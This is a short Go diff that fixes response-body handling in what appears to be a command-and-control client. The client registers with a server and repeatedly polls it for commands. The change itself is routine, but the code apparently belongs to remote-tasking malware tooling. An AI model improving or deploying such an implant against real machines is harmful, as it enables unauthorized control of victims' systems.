@@ -28,9 +28,8 @@ func main() {
 		log.Fatal(err)
 	}
 
-	defer register_resp.Body.Close()
-
 	body, err := io.ReadAll(register_resp.Body)
+	register_resp.Body.Close()
 	var registerResponse RegisterResponse
 	err = json.Unmarshal(body, &registerResponse)
 	if err != nil {
@@ -54,11 +53,11 @@ loop:
 		if err != nil {
 			log.SetFlags(0)
 			log.Printf("[-] Error fetching command: %s", err)
+			continue
 		}
 
-		defer execute_response.Body.Close()
-
 		command, err := io.ReadAll(execute_response.Body)
+		execute_response.Body.Close()
 
 		if string(command) == "no commands found" {
 			log.SetFlags(0)
